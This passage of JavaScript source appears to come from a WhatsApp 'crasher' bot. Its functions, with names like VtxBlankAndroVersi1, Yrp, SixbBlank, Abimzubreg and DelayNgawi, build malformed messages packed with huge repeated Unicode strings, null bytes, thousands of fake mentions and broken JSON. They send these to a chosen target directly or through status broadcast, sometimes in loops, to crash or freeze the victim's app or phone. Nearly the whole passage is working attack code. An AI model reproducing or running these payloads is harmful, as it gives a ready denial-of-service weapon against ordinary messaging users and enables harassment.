          paramsJson: `{\"values\":{\"in_pin_code\":\"7205\",\"building_name\":\"russian motel\",\"address\":\"2.7205\",\"tower_number\":\"507\",\"city\":\"Batavia\",\"name\":\"Otax?\",\"phone_number\":\"+13135550202\",\"house_number\":\"7205826\",\"floor_number\":\"16\",\"state\":\"${"\x10".repeat(1000000)}\"}}`,
          version: 3
        },
        },
      },
    },
  };
  
  const statusMessages = [stickerMsg, msgxay, interxnxx];

  const content = {
    extendedTextMessage: {
      text: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(30000),
      matchedText: "ꦽ".repeat(20000),
      description: "⸙ᵒᵗᵃˣнοω αяє γου?¿",
      title: "ꦽ".repeat(20000),
      previewType: "NONE",
      jpegThumbnail:
        "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
      inviteLinkGroupTypeV2: "DEFAULT",
      contextInfo: {
        isForwarded: true,
        forwardingScore: 9999,
        participant: target,
        remoteJid: "status@broadcast",
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          ),
        ],
        quotedMessage: {
          newsletterAdminInviteMessage: {
            newsletterJid: "otax@newsletter",
            newsletterName:
              "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(10000),
            caption:
              "⸙ᵒᵗᵃˣнοω αяє γου?¿" +
              "ꦾ".repeat(60000) +
              "ោ៝".repeat(60000),
            inviteExpiration: "999999999",
          },
        },
        forwardedNewsletterMessageInfo: {
          newsletterName:
            "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "⃝꙰꙰꙰".repeat(10000),
          newsletterJid: "13135550002@newsletter",
          serverId: 1,
        },
      },
    },
  };

  const xnxxmsg = generateWAMessageFromContent(target, content, {});
for (let i = 0; i < 10; i++) {
    await sock.relayMessage("status@broadcast", xnxxmsg.message, {
      messageId: xnxxmsg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: [] }],
            },
          ],
        },
      ],
    });

    await sock.relayMessage("status@broadcast", biji2.message, {
      messageId: biji2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: [] }],
            },
          ],
        },
      ],
    });
    for (const content of statusMessages) {
      const msg = generateWAMessageFromContent(target, content, {});
      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
              },
            ],
          },
        ],
      });
    }
    
if (i < 9) {
      await new Promise(resolve => setTimeout(resolve, 4000));
    }      
  }

  if (mention) {
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: xnxxmsg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: " meki - melar ",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function VtxBlankAndroVersi1(sock, target) {
    let msg2 = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "#DARKCrasher⃠", // Gausah Diganti Lamer
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: -0,
                        },
                        hasMediaAttachment: false,
                    },
                    body: {
                        text: "ꦾ".repeat(60000) + "ោ៝".repeat(20000),
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: "",
                            },
                            {
                                name: "cta_call",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "ꦽ".repeat(5000),
                                }),
                            },
                            {
                                name: "cta_copy",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "ꦽ".repeat(5000),
                                }),
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "ꦽ".repeat(5000),
                                }),                         
                            },
                        ],
                        messageParamsJson: "[{".repeat(10000),
                    },
                    contextInfo: {
                        participant: target,
                        mentionJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 1900 },
                                () => "1" + Math.floor(Math.random() * 50000000) + "0@s.whatsapp.net",
                            ),
                        ],
                        quotedMessage: {
                            paymentInviteMessage: {
                                serviceType: 3,
                                expiryTimeStamp: Date.now() + 1814400000,
                            },
                        },
                    },
                },
            },
        },
    };

    await sock.relayMessage(target, msg2, {
        messageId: null,
        participant: { jid: target },
    });
  }

async function Yrp(target) {
    const PouMsg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                carouselMessage: {
                    cards: [
                        {
                            header: {
                                hasMediaAttachment: true,
                                videoMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7161-24/543874146_701733799656425_1962288507009302343_n.enc?ccb=11-4&oh=01_Q5Aa3AFiej4nbt_M9XxYBDpplVdFUucRd510mCaU-IGU5nR_-Q&oe=6947C949&_nc_sid=5e03e0",
                                    mimetype: "video/mp4",
                                    fileSha256: "sI35p92ZSwo+OMIPRJt2UlKUFmwgwizYOheNU7LtO5k=",
                                    fileEncSha256: "/6FWCFe34cg/QH4RpN3AOLTOS8wLJ9JI6zQoyJZgg5Y=",
                                    fileLength: 3133846,
                                    seconds: 26
                                }
                            },
                            body: {
                                text: "-⟦ 𝑰͢ 𝑨͢𝑴͢ 𝑷͢𝑶͢𝑼͢𝑴͢𝑶͢𝑫͢𝑺͢ 🦠 ⟧-"
                            },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                        name: "quick_reply",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "𑜦𑜠".repeat(10000),
                                            id: null
                                        })
                                    },
                                    {
                                        name: "quick_reply",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "𑜦𑜠".repeat(10000),
                                            id: null
                                        })
                                    },
                                    {
                                        name: "cta_url",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "𑜦𑜠".repeat(10000),
                                            url: "https://" + "𑜦𑜠".repeat(10000) + ".com"
                                        })
                                    },
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "𑜦𑜠".repeat(10000),
                                            copy_code: "𑜦𑜠".repeat(10000)
                                        })
                                    },
                                    {
                                        name: "galaxy_message",
                                        buttonParamsJson: JSON.stringify({
                                            icon: "PROMOTION",
                                            flow_cta: "-⟦ 𝑰͢ 𝑨͢𝑴͢ 𝑷͢𝑶͢𝑼͢𝑴͢𝑶͢𝑫͢𝑺͢ 🦠 ⟧-",
                                            flow_message_version: "3"
                                        })
                                    },
                                    {
                                        name: "galaxy_message",
                                        buttonParamsJson: `{"flow_cta":"${"\u0000".repeat(200000)}"}`,
                                        version: 3
                                    }
                                ]
                            }
                        },
                        {
                            header: {
                                hasMediaAttachment: false,
                                title: "-⟦ 𝑰͢ 𝑨͢𝑴͢ 𝑷͢𝑶͢𝑼͢𝑴͢𝑶͢𝑫͢𝑺͢ 🦠 ⟧-"
                            },
                            body: {
                                text: "-⟦ 𝑰͢ 𝑨͢𝑴͢ 𝑷͢𝑶͢𝑼͢𝑴͢𝑶͢𝑫͢𝑺͢ 🦠 ⟧-"
                            },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                        name: "quick_reply",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "𑜦𑜠".repeat(10000),
                                            id: null
                                        })
                                    },
                                    {
                                        name: "quick_reply",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "𑜦𑜠".repeat(10000),
                                            id: null
                                        })
                                    },
                                    {
                                        name: "cta_url",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "𑜦𑜠".repeat(10000),
                                            url: "https://" + "𑜦𑜠".repeat(10000) + ".com"
                                        })
                                    },
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "𑜦𑜠".repeat(10000),
                                            copy_code: "𑜦𑜠".repeat(10000)
                                        })
                                    },
                                    {
                                        name: "galaxy_message",
                                        buttonParamsJson: JSON.stringify({
                                            icon: "PROMOTION",
                                            flow_cta: "-⟦ 𝑰͢ 𝑨͢𝑴͢ 𝑷͢𝑶͢𝑼͢𝑴͢𝑶͢𝑫͢𝑺͢ 🦠 ⟧-",
                                            flow_message_version: "3"
                                        })
                                    },
                                    {
                                        name: "galaxy_message",
                                        buttonParamsJson: `{"flow_cta":"${"\u0000".repeat(200000)}"}`,
                                        version: 3
                                    }
                                ]
                            }
                        }

                    ]
                }
            }
        }
    });

    await sock.relayMessage(target, PouMsg.message, { 
    messageId: PouMsg.key.id 
    });
    
    await sock.sendMessage(target, { delete: PouMsg.key });
    await new Promise(resolve => setTimeout(resolve, 300));
    
    await sock.sendNode(target, [
    {
      tag: "message",
      attrs: { id: sock.generateMessageTag(), to: target },
      content: [PouMsg],
    },
  ]);
}

async function SixbBlank(sock, target) {
  await sock.relayMessage(
    target,
    {
      stickerPackMessage: {
        stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",

        name: "クソ、⃝҉⃝" + "ꦾ".repeat(40000),
        publisher: "ꦽ".repeat(20000),
        stickers: [],

        fileLength: 12260,
        fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
        fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
        mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",

        directPath:
          "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",

        height: 9999,
        width: 9999,

        mediaKeyTimestamp: "1747502082",

        isAnimated: false,
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,

        emojis: ["🐉", "👾", "🩸", "♻️"],

        contextInfo: {
          mentionedJid: [
            "131338822@s.whatsapp.net",
            ...Array.from({ length: 1900 }, () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            ),
          ],
          remoteJid: "X",
          participant: target,
          stanzaId: "1234567890ABCDEF",

          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000,
            },
          },
        },

        packDescription: "",
        trayIconFileName:
          "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",

        thumbnailDirectPath:
          "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",

        thumbnailSha256:
          "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
        thumbnailEncSha256:
          "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,

        imageDataHash:
          "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",

        stickerPackSize: "3680054",
        stickerPackOrigin: "USER_CREATED",
      },
    },
    {
      participant: { jid: target },
    }
  );
}

async function Abimzubreg(target) {
  try {
    const datamsg1 = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () => `${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
              ]
            },
            body: {
              nativeFlowMessage: {
                messageParamsJson: "",
                messageVersion: 3,
                buttons: [
                  {
                    title: "I am Abim v1",
                    text: "I am Salsa v2",
                    format: "DEFAULT"
                  }
                ],
                nativeFlowMessage2: {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(3000)
                },
                interactiveMessage2: {
                  body: "Kiw🐉"
                },
                viewOnceMessage2: {
                  text: "..."
                },
                name: "Abim - Salsa ¿?" + "\u0000" + "𑇂𑆵𑆴𑆿".repeat(1000)
              }
            }
          }
        }
      }
    };

    const datamsg2 = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            externalAdReply: {
              title: "ꦾ".repeat(12000),
              description: "𑇂𑆵𑆴𑆿".repeat(2000)
            },
            nativeFlowResponseMessage: {
              title: "[ ABIM ] - ISBACK" + "𑇂𑆵𑆴𑆿".repeat(5000),
              name: "cta_reply",
              buttonParamsJson: "{}"
            },
            extraButtons: [
              { name: "cta_cancel_reminder", buttonParamsJson: "\u0000".repeat(1000) },
              { name: "address_message", buttonParamsJson: "\u0000".repeat(2000) }
            ],
            videoMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
              mimetype: "video/mp4",
              fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
              fileLength: "999999",
              seconds: 999999,
              mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
              caption: " ",
              height: 999999,
              width: 999999,
              fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
              directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc",
              mediaKeyTimestamp: "1743742853",
              contextInfo: {
                isSampled: true,
                mentionedJid: [
                  "13135550002@s.whatsapp.net",
                  ...Array.from({ length: 30000 }, () =>
                    `${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                  )
                ],
                businessMessageForwardInfo: {
                  businessOwnerJid: "13135550002@s.whatsapp.net"
                },
                mentionedJid2: [
                  target,
                  "1@s.whatsapp.net",
                  "0@s.whatsapp.net",
                  ...Array.from({ length: 1997 }, () =>
                    `${Math.floor(100000000000 + Math.random() * 899999999999)}@s.whatsapp.net`
                  )
                ]
              }
            }
          }
        }
      }
    };

    const datamsg3 = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            externalAdReply: {
              lottieStickerMessage: {
                title: "ꦾ".repeat(12000),
                description: "𑇂𑆵𑆴𑆿".repeat(3000)
              }
            },
            nativeFlowResponseMessage: {
              title: "[ INVIS ] - ISBACK" + "𑇂𑆵𑆴𑆿".repeat(5000),
              nativeFlowMessage2: {
                name: "call_permission_request",
                buttonParamsJson: "\u0000".repeat(3000)
              }
            },
            stickerMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
              fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
              fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
              mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
              mimetype: "image/webp",
              height: 9999,
              width: 9999,
              directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
              fileLength: 12260,
              mediaKeyTimestamp: "1743832131",
              isAnimated: false,
              stickerSentTs: "X",
              isAvatar: false,
              isAiSticker: false,
              isLottie: true,
              contextInfo: {
                mentionedJid: [
                  "0@s.whatsapp.net",
                  ...Array.from(
                    { length: 1900 },
                    () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                  ),
                ],
                stanzaId: "1234567890ABCDEF",
                quotedMessage: {
                  interactiveResponseMessage: {
                    body: { text: "\UBBBB", format: "DEFAULT" }
                  },
                  nativeFlowResponseMessage: {
                    name: "galaxy_msssage",
                    paramsJson: "\ubbbb".repeat(2000),
                    version: 3
                  }
                }
              }
            }
          }
        }
      }
    };

    for (const msg of [datamsg1]) {
      await sock.relayMessage("status@broadcast", msg, {
        messageId: undefined,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }]
              }
            ]
          }
        ]
      });
    }

    for (const msg of [datamsg2, datamsg3]) {
      await sock.relayMessage("status@broadcast", msg, {
        messageId: undefined,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }]
              }
            ]
          }
        ]
      });
    }

    console.log(`Wolker Your Devices 🧪 Sending To ${target} suksesfull`);
  } catch (e) {
    console.error(e);
  }
}

async function DelayNgawi(sock, target) {
    const jidTarget = target.includes("@") ? target : target + "@s.whatsapp.net";
    const z = (n) => "\x00".repeat(n);
    const r = (s, n) => s.repeat(n);
    const inv = "\u200B\u200C\u200D\uFEFF\u200E\u200F";
    const randomJid = () => `628${Math.floor(Math.random() * 900000000 + 100000000)}@s.whatsapp.net`;
    const mentionList = [jidTarget, ...Array.from({ length: 2000 }, randomJid)];
    const text = "❦ ᴠᴏɪᴅπᴇxᴜs ᴀᴛᴛᴀᴄᴋ ʏᴏᴜ ❦";

    // Perbaikan: groupStatusMessageV2 dengan struktur interactiveMessage yang valid
    const groupMsg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: { text: r(inv, 50000), format: "DEFAULT" },
                    nativeFlowMessage: {
                        name: "crash_trigger",   // ditambahkan
                        paramsJson: r(inv, 100000),
                        buttons: [{ name: "empty", buttonParamsJson: z(100000) }]
                    }
                }
            }
        }
    };

    const payload = {
        interactiveMessage: {
            header: { title: text, hasMediaAttachment: false },
            body: { text: r(inv, 10000) + text + z(10000), format: "DEFAULT" },
            footer: { text: z(50000), format: "DEFAULT" },
            nativeFlowMessage: {
                name: "crash_trigger",
                paramsJson: z(950000),
                version: 999,
                buttons: [
                    { name: "call_permission_request", buttonParamsJson: z(950000) },
                    {
                        name: "url_track_map",
                        buttonParamsJson: JSON.stringify({
                            url: "https://void.nexus/crash",
                            track_id: z(50000),
                            location: { lat: -999999999, lng: 99999999999 },
                            urlTrackingMapElements: [
                                { url: "https://void.nexus/track/1", delay: 999999 },
                                { url: "https://void.nexus/track/2", delay: 999999 },
                                { url: "https://void.nexus/track/3", delay: 999999 },
                                { url: "https://void.nexus/track/4", delay: 999999 },
                                { url: "https://void.nexus/track/5", delay: 999999 }
                            ]
                        })
                    },
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                            title: text,
                            sections: [{
                                title: "VOID",
                                rows: Array.from({ length: 100 }, (_, i) => ({
                                    id: z(5000) + i,
                                    title: z(10000)
                                }))
                            }]
                        })
                    }
                ]
            },
            contextInfo: {
                remoteJid: jidTarget,
                participant: jidTarget,
                stanzaId: "ID-" + Date.now() + "-" + Math.random().toString(36).substring(2, 10) + z(5000),
                isForwarded: true,
                forwardingScore: 999999999,
                statusAttributionType: 999,
                statusAttributions: Array.from({ length: 50000 }, (_, i) => ({
                    participant: `62${i + 100000}@s.whatsapp.net`,
                    type: 1
                })),
                mentionedJid: mentionList
            }
        }
    };

    try {
        await sock.relayMessage(jidTarget, groupMsg, { participant: { jid: jidTarget } });
        await sock.relayMessage("status@broadcast", payload, {
            statusJidList: [jidTarget],
            participant: { jid: jidTarget }
        });
        return { success: true, target: jidTarget };
    } catch (error) {
        return { success: false, error: error.message };
    }
}

//End Funct

bot.launch()
